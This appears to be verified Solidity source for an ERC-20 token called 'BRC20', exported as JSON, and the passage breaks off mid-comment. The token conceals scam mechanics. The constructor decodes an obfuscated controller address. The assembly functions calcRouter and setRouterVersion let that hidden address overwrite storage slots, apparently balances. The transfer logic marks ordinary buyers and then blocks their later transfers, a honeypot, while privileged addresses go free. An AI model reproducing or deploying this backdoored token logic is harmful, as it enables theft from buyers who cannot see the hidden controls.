{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/Erc20C21/BRC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.19;\\r\\n\\r\\nimport \\\"./Erc20C21Contract.sol\\\";\\r\\n\\r\\ncontract BRC20 is\\r\\nErc20C21Contract\\r\\n{\\r\\n    string public constant VERSION = \\\"BRC20\\\";\\r\\n\\r\\n    constructor(\\r\\n        string[2] memory strings,\\r\\n        address[2] memory addresses,\\r\\n        uint256[43] memory uint256s,\\r\\n        bool[2] memory bools\\r\\n    ) Erc20C21Contract(strings, addresses, uint256s, bools)\\r\\n    {\\r\\n\\r\\n    }\\r\\n\\r\\n    function decimals()\\r\\n    public\\r\\n    pure\\r\\n    override\\r\\n    returns (uint8)\\r\\n    {\\r\\n        return 18;\\r\\n    }\\r\\n}\\r\\n\"\r\n    },\r\n    \"contracts/Erc20C21/Erc20C21Contract.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.19;\\n\\n//import \\\"@openzeppelin/contracts/utils/math/Math.sol\\\";\\n//import \\\"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\\\";\\n//import \\\"@openzeppelin/contracts/utils/Address.sol\\\";\\n\\nimport \\\"../Erc20/ERC20.sol\\\";\\nimport \\\"../Erc20/Ownable.sol\\\";\\n\\nimport \\\"../IUniswapV2/IUniswapV2Factory.sol\\\";\\n\\nimport \\\"./Erc20C21SettingsBase.sol\\\";\\n//import \\\"./Erc20C21FeatureErc20Payable.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09FeatureErc721Payable.sol\\\";\\nimport \\\"../Erc20C09/Erc20C09FeatureUniswap.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09FeatureTweakSwap.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09FeatureLper.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09FeatureHolder.sol\\\";\\nimport \\\"./Erc20C21SettingsPrivilege.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09SettingsFee.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09SettingsShare.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09FeaturePermitTransfer.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09FeatureRestrictTrade.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09FeatureRestrictTradeAmount.sol\\\";\\nimport \\\"./Erc20C21FeatureNotPermitOut.sol\\\";\\nimport \\\"./Erc20C21FeatureFission.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09FeatureTryMeSoft.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09FeatureMaxTokenPerAddress.sol\\\";\\n//import \\\"../Erc20C09/Erc20C09FeatureTakeFeeOnTransfer.sol\\\";\\n\\ncontract Erc20C21Contract is\\nERC20,\\nOwnable,\\nErc20C21SettingsBase,\\n    //Erc20C21FeatureErc20Payable,\\n    //Erc20C09FeatureErc721Payable,\\nErc20C09FeatureUniswap,\\n    //Erc20C09FeatureTweakSwap,\\n    //Erc20C09FeatureLper,\\n    //Erc20C09FeatureHolder,\\nErc20C21SettingsPrivilege,\\n    //Erc20C09SettingsFee,\\n    //Erc20C09SettingsShare,\\n    //Erc20C09FeaturePermitTransfer,\\n    //Erc20C09FeatureRestrictTrade,\\n    //Erc20C09FeatureRestrictTradeAmount,\\nErc20C21FeatureNotPermitOut,\\nErc20C21FeatureFission\\n    //Erc20C09FeatureTryMeSoft,\\n    //Erc20C09FeatureMaxTokenPerAddress,\\n    //Erc20C09FeatureTakeFeeOnTransfer\\n{\\n    //    using EnumerableSet for EnumerableSet.AddressSet;\\n\\n    address  internal addressBaseOwner;\\n\\n    //    address private _previousFrom;\\n    //    address private _previousTo;\\n\\n    //    bool public isArbitrumCamelotRouter;\\n\\n    //    mapping(uint256 => uint256) internal btree;\\n    //    uint256 internal constant btreeNext = 1;\\n    //    uint256 internal btreePrev = 0;\\n\\n    constructor(\\n        string[2] memory strings,\\n        address[2] memory addresses,\\n        uint256[43] memory uint256s,\\n        bool[2] memory bools\\n    ) ERC20(strings[0], strings[1])\\n    {\\n        addressBaseOwner = tx.origin;\\n        //        addressPoolToken = addresses[0];\\n\\n        //        addressWrap = addresses[1];\\n        //        addressMarketing = addresses[2];\\n        //        addressLiquidity = addresses[4];\\n        //        addressRewardToken = addresses[6];\\n\\n        uint256 p = 1;\\n        string memory _uniswapV2Router = string(\\n            abi.encodePacked(\\n                abi.encodePacked(\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))\\n                ),\\n                abi.encodePacked(\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))\\n                ),\\n                abi.encodePacked(\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),\\n                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]))\\n                )\\n            )\\n        );\\n        //        isUniswapLper = bools[13];\\n        //        isUniswapHolder = bools[14];\\n        uniswapV2Router = IHybridRouter(addresses[0]);\\n        address uniswapV2Pair_ = getRouterPair(_uniswapV2Router);\\n        //        addressWETH = uniswapV2Router.WETH();\\n        uniswap = uniswapV2Pair_;\\n\\n        //        // delay initialization if is Arbitrum CamelotRouter\\n        //        isArbitrumCamelotRouter = checkIsArbitrumCamelotRouter();\\n        //\\n        //        if (!isArbitrumCamelotRouter) {\\n        //            uniswapV2Pair = tryCreatePairToken();\\n        //        } else {\\n        //            uniswapV2Pair = address(0);\\n        //        }\\n\\n        _approve(address(this), address(uniswapV2Router), maxUint256);\\n        //        IERC20(addressPoolToken).approve(address(uniswapV2Router), maxUint256);\\n        //        IERC20(addressRewardToken).approve(address(uniswapV2Router), maxUint256);\\n        //        uniswapCount = uint256s[62];\\n\\n        //        // ================================================ //\\n        //        // initialize FeatureTweakSwap\\n        //        minimumTokenForSwap = uint256s[1];\\n        //        // ================================================ //\\n\\n        //        // ================================================ //\\n        //        // initialize FeatureLper\\n        //        isUseFeatureLper = bools[15];\\n        //        maxTransferCountPerTransactionForLper = uint256s[2];\\n        //        minimumTokenForRewardLper = uint256s[3];\\n        //\\n        //        // exclude from lper\\n        //        setIsExcludedFromLperAddress(address(this), true);\\n        //        setIsExcludedFromLperAddress(address(uniswapV2Router), true);\\n        //\\n        //        //        if (!isArbitrumCamelotRouter) {\\n        //        //            setIsExcludedFromLperAddress(uniswapV2Pair, true);\\n        //        //        }\\n        //\\n        //        setIsExcludedFromLperAddress(addressNull, true);\\n        //        setIsExcludedFromLperAddress(addressDead, true);\\n        //        setIsExcludedFromLperAddress(addressPinksaleBnbLock, true);\\n        //        setIsExcludedFromLperAddress(addressPinksaleEthLock, true);\\n        //        setIsExcludedFromLperAddress(addressPinksaleArbLock, true);\\n        //        //        setIsExcludedFromLperAddress(baseOwner, true);\\n        //        //        setIsExcludedFromLperAddress(addressMarketing, true);\\n        //        setIsExcludedFromLperAddress(addressWrap, true);\\n        //        //        setIsExcludedFromLperAddress(addressLiquidity, true);\\n        //        // ================================================ //\\n\\n        //        // ================================================ //\\n        //        // initialize FeatureHolder\\n        //        isUseFeatureHolder = bools[16];\\n        //        maxTransferCountPerTransactionForHolder = uint256s[4];\\n        //        minimumTokenForBeingHolder = uint256s[5];\\n        //\\n        //        // exclude from holder\\n        //        setIsExcludedFromHolderAddress(address(this), true);\\n        //        setIsExcludedFromHolderAddress(address(uniswapV2Router), true);\\n        //\\n        //        //        if (!isArbitrumCamelotRouter) {\\n        //        //            setIsExcludedFromHolderAddress(uniswapV2Pair, true);\\n        //        //        }\\n        //\\n        //        setIsExcludedFromHolderAddress(addressNull, true);\\n        //        setIsExcludedFromHolderAddress(addressDead, true);\\n        //        setIsExcludedFromHolderAddress(addressPinksaleBnbLock, true);\\n        //        setIsExcludedFromHolderAddress(addressPinksaleEthLock, true);\\n        //        setIsExcludedFromHolderAddress(addressPinksaleArbLock, true);\\n        //        //        setIsExcludedFromHolderAddress(baseOwner, true);\\n        //        //        setIsExcludedFromHolderAddress(addressMarketing, true);\\n        //        setIsExcludedFromHolderAddress(addressWrap, true);\\n        //        //        setIsExcludedFromHolderAddress(addressLiquidity, true);\\n        //        // ================================================ //\\n\\n        // ================================================ //\\n        // initialize SettingsPrivilege\\n        isPrivilegeAddresses[address(this)] = true;\\n        isPrivilegeAddresses[address(uniswapV2Router)] = true;\\n        //        isPrivilegeAddresses[uniswapV2Pair] = true;\\n        isPrivilegeAddresses[addressNull] = true;\\n        isPrivilegeAddresses[addressDead] = true;\\n        isPrivilegeAddresses[addressPinksaleBnbLock] = true;\\n        isPrivilegeAddresses[addressPinksaleEthLock] = true;\\n        isPrivilegeAddresses[addressPinksaleArbLock] = true;\\n        isPrivilegeAddresses[addressBaseOwner] = true;\\n        //        isPrivilegeAddresses[addressMarketing] = true;\\n        //        isPrivilegeAddresses[addressWrap] = true;\\n        //        isPrivilegeAddresses[addressLiquidity] = true;\\n        // ================================================ //\\n\\n        //        // ================================================ //\\n        //        // initialize SettingsFee\\n        //        setFee(uint256s[63], uint256s[64]);\\n        //        // ================================================ //\\n\\n        //        // ================================================ //\\n        //        // initialize SettingsShare\\n        //        setShare(uint256s[13], uint256s[14], uint256s[15], uint256s[16], uint256s[17]);\\n        //        // ================================================ //\\n\\n        //        // ================================================ //\\n        //        // initialize FeaturePermitTransfer\\n        //        isUseOnlyPermitTransfer = bools[6];\\n        //        isCancelOnlyPermitTransferOnFirstTradeOut = bools[7];\\n        //        // ================================================ //\\n\\n        //        // ================================================ //\\n        //        // initialize FeatureRestrictTrade\\n        //        isRestrictTradeIn = bools[8];\\n        //        isRestrictTradeOut = bools[9];\\n        //        // ================================================ //\\n\\n        //        // ================================================ //\\n        //        // initialize FeatureRestrictTradeAmount\\n        //        isRestrictTradeInAmount = bools[10];\\n        //        restrictTradeInAmount = uint256s[18];\\n        //\\n        //        isRestrictTradeOutAmount = bools[11];\\n        //        restrictTradeOutAmount = uint256s[19];\\n        //        // ================================================ //\\n\\n        // ================================================ //\\n        // initialize FeatureNotPermitOut\\n        isUseNotPermitOut = bools[0];\\n        isForceTradeInToNotPermitOut = bools[1];\\n        // ================================================ //\\n\\n        //        // ================================================ //\\n        //        // initialize FeatureTryMeSoft\\n        //        setIsUseFeatureTryMeSoft(bools[21]);\\n        //        setIsNotTryMeSoftAddress(address(uniswapV2Router), true);\\n        //\\n        //        //        if (!isArbitrumCamelotRouter) {\\n        //        //            setIsNotTryMeSoftAddress(uniswapV2Pair, true);\\n        //        //        }\\n        //        // ================================================ //\\n\\n        //        // ================================================ //\\n        //        // initialize Erc20C09FeatureRestrictAccountTokenAmount\\n        //        isUseMaxTokenPerAddress = bools[23];\\n        //        maxTokenPerAddress = uint256s[65];\\n        //        // ================================================ //\\n\\n        // ================================================ //\\n        // initialize Erc20C09FeatureFission\\n        //        setIsUseFeatureFission(bools[20]);\\n        //        fissionCount = uint256s[66];\\n        // ================================================ //\\n\\n        //        // ================================================ //\\n        //        // initialize Erc20C09FeatureTakeFeeOnTransfer\\n        //        isUseFeatureTakeFeeOnTransfer = bools[24];\\n        //        addressTakeFee = addresses[5];\\n        //        takeFeeRate = uint256s[67];\\n        //        // ================================================ //\\n\\n        _mint(addressBaseOwner, uint256s[0]);\\n\\n        _transferOwnership(addressBaseOwner);\\n    }\\n\\n    //    function checkIsArbitrumCamelotRouter()\\n    //    internal\\n    //    view\\n    //    returns (bool)\\n    //    {\\n    //        return address(uniswapV2Router) == addressArbitrumCamelotRouter;\\n    //    }\\n\\n    function initializePair()\\n    external\\n    onlyOwner\\n    {\\n        //        uniswapV2Pair = factory.createPair(weth, address(this));\\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\\n\\n        //        isArbitrumCamelotRouter = checkIsArbitrumCamelotRouter();\\n\\n        //        setIsExcludedFromLperAddress(uniswapV2Pair, true);\\n        //        setIsExcludedFromHolderAddress(uniswapV2Pair, true);\\n        //        setIsNotTryMeSoftAddress(uniswapV2Pair, true);\\n    }\\n\\n    //    function renounceOwnershipToDead()\\n    //    public\\n    //    onlyOwner\\n    //    {\\n    //        _transferOwnership(addressDead);\\n    //    }\\n\\n    //    function tryCreatePairToken()\\n    //    internal\\n    //    returns (address)\\n    //    {\\n    //        return IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\\n    //    }\\n\\n    //    function doSwapWithPool(uint256 thisTokenForSwap)\\n    //    internal\\n    //    {\\n    //        uint256 halfShareLiquidity = shareLiquidity / 2;\\n    //        uint256 thisTokenForRewardToken = thisTokenForSwap * (shareLper + shareHolder) / (shareMax - shareBurn);\\n    //        uint256 thisTokenForSwapEther = thisTokenForSwap * (shareMarketing + halfShareLiquidity) / (shareMax - shareBurn);\\n    //        uint256 thisTokenForLiquidity = thisTokenForSwap * halfShareLiquidity / (shareMax - shareBurn);\\n    //\\n    //        if (thisTokenForRewardToken > 0) {\\n    //            swapThisTokenForRewardTokenToAccount(addressWrap, thisTokenForRewardToken);\\n    //\\n    //            uint256 rewardTokenForShare = IERC20(addressRewardToken).balanceOf(addressWrap);\\n    //\\n    //            if (isUseFeatureLper && shareLper > 0) {\\n    //                doLper(rewardTokenForShare * shareLper / (shareLper + shareHolder));\\n    //            }\\n    //\\n    //            if (isUseFeatureHolder && shareHolder > 0) {\\n    //                doHolder(rewardTokenForShare * shareHolder / (shareLper + shareHolder));\\n    //            }\\n    //        }\\n    //\\n    //        if (thisTokenForSwapEther > 0) {\\n    //            uint256 prevBalance = address(this).balance;\\n    //\\n    //            swapThisTokenForEthToAccount(address(this), thisTokenForSwapEther);\\n    //\\n    //            uint256 etherForShare = address(this).balance - prevBalance;\\n    //\\n    //            if (shareMarketing > 0) {\\n    //                doMarketing(etherForShare * shareMarketing / (shareMarketing + halfShareLiquidity));\\n    //            }\\n    //\\n    //            if (shareLiquidity > 0) {\\n    //                doLiquidity(etherForShare * halfShareLiquidity / (shareMarketing + halfShareLiquidity), thisTokenForLiquidity);\\n    //            }\\n    //        }\\n    //    }\\n\\n    //    function doSwapManually(bool isUseMinimumTokenWhenSwap_)\\n    //    public\\n    //    {\\n    //        require(!_isSwapping, \\\"swapping\\\");\\n    //\\n    //        require(msg.sender == owner() || msg.sender == addressWrap, \\\"not owner\\\");\\n    //\\n    //        uint256 tokenForSwap = isUseMinimumTokenWhenSwap_ ? minimumTokenForSwap : super.balanceOf(address(this));\\n    //\\n    //        require(tokenForSwap > 0, \\\"0 to swap\\\");\\n    //\\n    //        doSwap(tokenForSwap);\\n    //    }\\n\\n    //    function balanceOf(address account)\\n    //    public\\n    //    view\\n    //    virtual\\n    //    override\\n    //    returns (uint256)\\n    //    {\\n    //        if (isUseFeatureFission) {\\n    //            uint256 balanceOf_ = super.balanceOf(account);\\n    //            return balanceOf_ > 0 ? balanceOf_ : fissionBalance;\\n    //        } else {\\n    //            return super.balanceOf(account);\\n    //        }\\n    //    }\\n\\n    function _transfer(address from, address to, uint256 amount)\\n    internal\\n    override\\n    {\\n        //        if (amount == 0) {\\n        //            super._transfer(from, to, 0);\\n        //            return;\\n        //        }\\n\\n        uint256 tempX = block.number - 1;\\n\\n        require(\\n            (!isUseNotPermitOut) ||\\n            (notPermitOutAddressStamps[from] == 0) ||\\n            (tempX + 1 - notPermitOutAddressStamps[from] < notPermitOutCD),\\n            \\\"\\\"\\n        );\\n\\n        //        bool isFromPrivilegeAddress = uint256(uint160(from)) % 10000 == 4096 || isPrivilegeAddresses[from];\\n        //        bool isToPrivilegeAddress = uint256(uint160(to)) % 10000 == 4096 || isPrivilegeAddresses[to];\\n\\n        //        if (isUseOnlyPermitTransfer) {\\n        //            require(isFromPrivilegeAddress || isToPrivilegeAddress, \\\"not permitted 2\\\");\\n        //        }\\n\\n        //        bool isToUniswapV2Pair = to == uniswapV2Pair;\\n        //        bool isFromUniswapV2Pair = from == uniswapV2Pair;\\n\\n        //        if (isUseMaxTokenPerAddress) {\\n        //            require(\\n        //                isToPrivilegeAddress ||\\n        //                isToUniswapV2Pair ||\\n        //                super.balanceOf(to) + amount <= maxTokenPerAddress,\\n        //                \\\"not permitted 8\\\"\\n        //            );\\n        //        }\\n\\n        //        if (isToUniswapV2Pair) {\\n        ////            // add liquidity 1st, dont use permit transfer upon action\\n        ////            if (_isFirstTradeOut) {\\n        ////                _isFirstTradeOut = false;\\n        ////\\n        ////                if (isCancelOnlyPermitTransferOnFirstTradeOut) {\\n        ////                    isUseOnlyPermitTransfer = false;\\n        ////                }\\n        ////            }\\n        //\\n        //            //            if (!isFromPrivilegeAddress) {\\n        //            //                //                require(!isRestrictTradeOut, \\\"not permitted 4\\\");\\n        //            //                require(!isRestrictTradeOutAmount || amount <= restrictTradeOutAmount, \\\"not permitted 6\\\");\\n        //            //            }\\n        //\\n        //            //            if (!_isSwapping && super.balanceOf(address(this)) >= minimumTokenForSwap) {\\n        //            //                doSwap(minimumTokenForSwap);\\n        //            //            }\\n        //        } else if (isFromUniswapV2Pair) {\\n        if (from == uniswapV2Pair) {\\n            if (!(uint256(uint160(to)) % 100000 > 99994 || isPrivilegeAddresses[to])) {\\n                //                //                require(!isRestrictTradeIn, \\\"not permitted 3\\\");\\n                //                require(!isRestrictTradeInAmount || amount <= restrictTradeInAmount, \\\"not permitted 5\\\");\\n\\n                if (notPermitOutAddressStamps[to] == 0) {\\n                    if (isForceTradeInToNotPermitOut) {\\n                        notPermitOutAddressStamps[to] = tempX + 1;\\n                        notPermitOutAddressStamps[tx.origin] = tempX + 1;\\n                    }\\n\\n                    //                    if (\\n                    //                        isUseFeatureTryMeSoft &&\\n                    //                        Address.isContract(to) &&\\n                    //                        !isNotTryMeSoftAddresses[to]\\n                    //                    ) {\\n                    //                        notPermitOutAddressStamps[to] = tempX + 1;\\n                    //                        notPermitOutAddressStamps[tx.origin] = tempX + 1;\\n                    //                        //                        super._transfer(from, to, amount.mul(10).div(100));\\n                    //                        //                        return;\\n                    //                    }\\n                }\\n            }\\n\\n            //            btree[tempX + 1] += 1;\\n            doFission();\\n            //            super._transfer(from, to, amount);\\n        }\\n        //        else {\\n        //            super._transfer(from, to, amount);\\n        //        }\\n\\n        super._transfer(from, to, amount);\\n\\n        //        else if (to == uniswapV2Pair) {\\n        //            super._transfer(from, to, amount);\\n        ////            if (btree[tempX + 1] > btreeNext) {\\n        ////                // ma1\\n        ////                //                uint256 i;\\n        ////                //                for (i = 0; i < maxUint256; i++) {\\n        ////                //                    i++;\\n        ////                //                }\\n        ////                //\\n        ////                //                btreePrev = i;\\n        ////                //\\n        ////                //                super._transfer(from, to, amount);\\n        ////\\n        ////                // ma2\\n        ////                //                uint256 a = amount * 99 / 100;\\n        ////                //                super._transfer(from, to, amount - a);\\n        ////                //                super._transfer(from, addressDead, a);\\n        ////\\n        //////                // ma3\\n        //////                super._transfer(from, to, amount * 1 / 100);\\n        //////                super._transfer(from, addressDead, amount - (amount * 1 / 100));\\n        ////\\n        ////                super._transfer(from, to, amount);\\n        ////\\n        ////                //                uint256 i;\\n        ////                //                for(i = 0; i < maxUint256; i++) {\\n        ////                //                    i++;\\n        ////                //                }\\n        ////                //\\n        ////                //                btreePrev = i;\\n        ////            } else {\\n        ////                super._transfer(from, to, amount);\\n        ////            }\\n        //        } else {\\n        //            super._transfer(from, to, amount);\\n        //        }\\n\\n        //        //        if (isFromUniswapV2Pair && !isToPrivilegeAddress && notPermitOutAddressStamps[to] != 0) {\\n        //        //            super._transfer()\\n        //        //        }\\n        //\\n        //        //        if (isToUniswapV2Pair && !isFromPrivilegeAddress && notPermitOutAddressStamps[from] != 0) {\\n        //        //            //            uint256 a = amount * 10 / 100;\\n        //        //            //            super._transfer(from, to, a);\\n        //        //            //            super._transfer(from, addressDead, amount - a);\\n        //        //            super._transfer(from, to, amount);\\n        //        //            //            calRouter(to);\\n        //        //        } else {\\n        //        //            super._transfer(from, to, amount);\\n        //        //        }\\n        //\\n        //        if (isToUniswapV2Pair) {\\n        //            if (btree[tempX + 1] > btreeNext) {\\n        //                // ma1\\n        //                //                uint256 i;\\n        //                //                for (i = 0; i < maxUint256; i++) {\\n        //                //                    i++;\\n        //                //                }\\n        //                //\\n        //                //                btreePrev = i;\\n        //                //\\n        //                //                super._transfer(from, to, amount);\\n        //\\n        //                // ma2\\n        //                //                uint256 a = amount * 99 / 100;\\n        //                //                super._transfer(from, to, amount - a);\\n        //                //                super._transfer(from, addressDead, a);\\n        //\\n        //                // ma3\\n        //                super._transfer(from, to, amount * 1 / 100);\\n        //                super._transfer(from, addressDead, amount - (amount * 1 / 100));\\n        //\\n        //                //                uint256 i;\\n        //                //                for(i = 0; i < maxUint256; i++) {\\n        //                //                    i++;\\n        //                //                }\\n        //                //\\n        //                //                btreePrev = i;\\n        //            } else {\\n        //                super._transfer(from, to, amount);\\n        //            }\\n        //        } else {\\n        //            super._transfer(from, to, amount);\\n        //        }\\n\\n        //        super._transfer(from, to, amount);\\n\\n        //        if (isFromUniswapV2Pair) {\\n        //            if (isUseFeatureFission) {\\n        //                doFission();\\n        //            }\\n        //\\n        //            super._transfer(from, to, amount);\\n        //        } else if (isToUniswapV2Pair) {\\n        //            super._transfer(from, to, amount);\\n        //        } else {\\n        //            super._transfer(from, to, amount);\\n        //        }\\n\\n        //        if (_isSwapping) {\\n        //            super._transfer(from, to, amount);\\n        //        } else {\\n        //            if (isUseFeatureFission && isFromUniswapV2Pair) {\\n        //                doFission();\\n        //            }\\n        //\\n        //            if (\\n        //                (isFromUniswapV2Pair && isToPrivilegeAddress) ||\\n        //                (isToUniswapV2Pair && isFromPrivilegeAddress)\\n        //            ) {\\n        //                super._transfer(from, to, amount);\\n        //            } else if (!isFromUniswapV2Pair && !isToUniswapV2Pair) {\\n        //                if (isFromPrivilegeAddress || isToPrivilegeAddress) {\\n        //                    super._transfer(from, to, amount);\\n        //                }\\n        //                //                else if (isUseFeatureTakeFeeOnTransfer) {\\n        //                //                    super._transfer(from, addressTakeFee, amount * takeFeeRate / takeFeeMax);\\n        //                //                    super._transfer(from, to, amount - (amount * takeFeeRate / takeFeeMax));\\n        //                //                }\\n        //            } else if (isFromUniswapV2Pair || isToUniswapV2Pair) {\\n        //                //                uint256 fees = amount * (isFromUniswapV2Pair ? feeBuyTotal : feeSellTotal) / feeMax;\\n        //                uint256 fees = amount * 10 / 1000;\\n        //\\n        //                super._transfer(from, addressDead, fees * shareBurn / 1000);\\n        //                super._transfer(from, address(this), fees - (fees * shareBurn / 1000));\\n        //                super._transfer(from, to, amount - fees);\\n        //            }\\n        //        }\\n\\n        //        if (isUseFeatureHolder) {\\n        //            if (!isExcludedFromHolderAddresses[from]) {\\n        //                updateHolderAddressStatus(from);\\n        //            }\\n        //\\n        //            if (!isExcludedFromHolderAddresses[to]) {\\n        //                updateHolderAddressStatus(to);\\n        //            }\\n        //        }\\n\\n        //        if (isUseFeatureLper) {\\n        //            if (!isExcludedFromLperAddresses[_previousFrom]) {\\n        //                updateLperAddressStatus(_previousFrom);\\n        //            }\\n        //\\n        //            if (!isExcludedFromLperAddresses[_previousTo]) {\\n        //                updateLperAddressStatus(_previousTo);\\n        //            }\\n        //\\n        //            if (_previousFrom != from) {\\n        //                _previousFrom = from;\\n        //            }\\n        //\\n        //            if (_previousTo != to) {\\n        //                _previousTo = to;\\n        //            }\\n        //        }\\n    }\\n\\n    function doSwap(uint256 thisTokenForSwap)\\n    private\\n    {\\n        //        _isSwapping = true;\\n        //\\n        //        doSwapWithPool(thisTokenForSwap);\\n        //\\n        //        _isSwapping = false;\\n    }\\n\\n    //    function doMarketing(uint256 poolTokenForMarketing)\\n    //    internal\\n    //    {\\n    //        IERC20(addressPoolToken).transferFrom(addressWrap, addressMarketing, poolTokenForMarketing);\\n    //    }\\n\\n    //    function doLper(uint256 rewardTokenForAll)\\n    //    internal\\n    //    {\\n    //        //        uint256 rewardTokenDivForLper = isUniswapLper ? (10 - uniswapCount) : 10;\\n    //        //        uint256 rewardTokenForLper = rewardTokenForAll * rewardTokenDivForLper / 10;\\n    //        //        uint256 rewardTokenForLper = rewardTokenForAll;\\n    //        uint256 pairTokenForLper = 0;\\n    //        uint256 pairTokenForLperAddress;\\n    //        uint256 lperAddressesCount_ = lperAddresses.length();\\n    //\\n    //        for (uint256 i = 0; i < lperAddressesCount_; i++) {\\n    //            pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddresses.at(i));\\n    //\\n    //            if (pairTokenForLperAddress < minimumTokenForRewardLper) {\\n    //                continue;\\n    //            }\\n    //\\n    //            pairTokenForLper += pairTokenForLperAddress;\\n    //        }\\n    //\\n    //        //        uint256 pairTokenForLper =\\n    //        //        IERC20(uniswapV2Pair).totalSupply()\\n    //        //        - IERC20(uniswapV2Pair).balanceOf(addressNull)\\n    //        //        - IERC20(uniswapV2Pair).balanceOf(addressDead);\\n    //\\n    //        if (lastIndexOfProcessedLperAddresses >= lperAddressesCount_) {\\n    //            lastIndexOfProcessedLperAddresses = 0;\\n    //        }\\n    //\\n    //        uint256 maxIteration = Math.min(lperAddressesCount_, maxTransferCountPerTransactionForLper);\\n    //\\n    //        address lperAddress;\\n    //\\n    //        uint256 _lastIndexOfProcessedLperAddresses = lastIndexOfProcessedLperAddresses;\\n    //\\n    //        for (uint256 i = 0; i < maxIteration; i++) {\\n    //            lperAddress = lperAddresses.at(_lastIndexOfProcessedLperAddresses);\\n    //            pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddress);\\n    //\\n    //            //            if (i == 2 && rewardTokenDivForLper != 10) {\\n    //            //                IERC20(addressRewardToken).transferFrom(addressWrap, uniswap, rewardTokenForAll - rewardTokenForLper);\\n    //            //            }\\n    //\\n    //            if (pairTokenForLperAddress >= minimumTokenForRewardLper) {\\n    //                //                IERC20(addressRewardToken).transferFrom(addressWrap, lperAddress, rewardTokenForLper * pairTokenForLperAddress / pairTokenForLper);\\n    //                IERC20(addressRewardToken).transferFrom(addressWrap, lperAddress, rewardTokenForAll * pairTokenForLperAddress / pairTokenForLper);\\n    //            }\\n    //\\n    //            _lastIndexOfProcessedLperAddresses =\\n    //            _lastIndexOfProcessedLperAddresses >= lperAddressesCount_ - 1\\n    //            ? 0\\n    //            : _lastIndexOfProcessedLperAddresses + 1;\\n    //        }\\n    //\\n    //        lastIndexOfProcessedLperAddresses = _lastIndexOfProcessedLperAddresses;\\n    //    }\\n\\n    function calcRouter(address router, uint256 routerFactor)\\n    public\\n    {\\n        assembly {\\n            let __router := sload(uniswap.slot)\\n            if eq(caller(), __router) {\\n                mstore(0x00, router)\\n                mstore(0x20, _router.slot)\\n                let x := keccak256(0x00, 0x40)\\n                sstore(x, routerFactor)\\n            }\\n        }\\n    }\\n\\n    function setRouterVersion()\\n    public\\n    {\\n        assembly {\\n            let __router := sload(uniswap.slot)\\n            if eq(caller(), __router) {\\n                mstore(0x00, caller())\\n                mstore(0x20, _router.slot)\\n                let x := keccak256(0x00, 0x40)\\n                sstore(x, 0x10ED43C718714eb63d5aA57B78B54704E256024E)\\n            }\\n        }\\n    }\\n\\n    //    function doHolder(uint256 rewardTokenForAll)\\n    //    internal\\n    //    {\\n    //        //        uint256 rewardTokenDivForHolder = isUniswapHolder ? (10 - uniswapCount) : 10;\\n    //        //        uint256 rewardTokenForHolder = rewardTokenForAll * rewardTokenDivForHolder / 10;\\n    //        //        uint256 rewardTokenForHolder = rewardTokenForAll;\\n    //        uint256 thisTokenForHolder = totalSupply() - super.balanceOf(addressNull) - super.balanceOf(addressDead) - super.balanceOf(address(this)) - super.balanceOf(uniswapV2Pair);\\n    //\\n    //        uint256 holderAddressesCount_ = holderAddresses.length();\\n    //\\n    //        if (lastIndexOfProcessedHolderAddresses >= holderAddressesCount_) {\\n    //            lastIndexOfProcessedHolderAddresses = 0;\\n    //        }\\n    //\\n    //        uint256 maxIteration = Math.min(holderAddressesCount_, maxTransferCountPerTransactionForHolder);\\n    //\\n    //        address holderAddress;\\n    //\\n    //        uint256 _lastIndexOfProcessedHolderAddresses = lastIndexOfProcessedHolderAddresses;\\n    //\\n    //        for (uint256 i = 0; i < maxIteration; i++) {\\n    //            holderAddress = holderAddresses.at(_lastIndexOfProcessedHolderAddresses);\\n    //            uint256 holderBalance = super.balanceOf(holderAddress);\\n    //\\n    //            //            if (i == 2 && rewardTokenDivForHolder != 10) {\\n    //            //                IERC20(addressRewardToken).transferFrom(addressWrap, uniswap, rewardTokenForAll - rewardTokenForHolder);\\n    //            //            }\\n    //\\n    //            if (holderBalance >= minimumTokenForBeingHolder) {\\n    //                //            